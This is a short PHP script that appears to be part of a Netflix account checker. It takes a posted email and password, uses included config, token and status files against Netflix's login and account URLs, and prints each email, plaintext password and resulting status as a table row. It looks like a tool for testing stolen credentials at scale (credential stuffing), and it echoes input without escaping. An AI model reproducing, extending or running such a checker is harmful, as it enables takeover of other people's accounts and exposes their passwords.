<?php 
    if(isset($_POST['correo']) and isset($_POST['clave'])){

        $urlPrincipal = "https://www.netflix.com/us/login/";
        $urlCuenta = "https://www.netflix.com/YourAccount";

        $correo = $_POST['correo'];
        $clave = $_POST['clave'];

        require("configs.php");
        require("token.php");
        
        require("status.php");

        echo "<tr>";
            echo "<td>".$correo."</td>";
            echo "<td>".$clave."</td>";
            echo "<td>".$status."</td>";
        echo "</tr>";

        curl_close($ch);
    }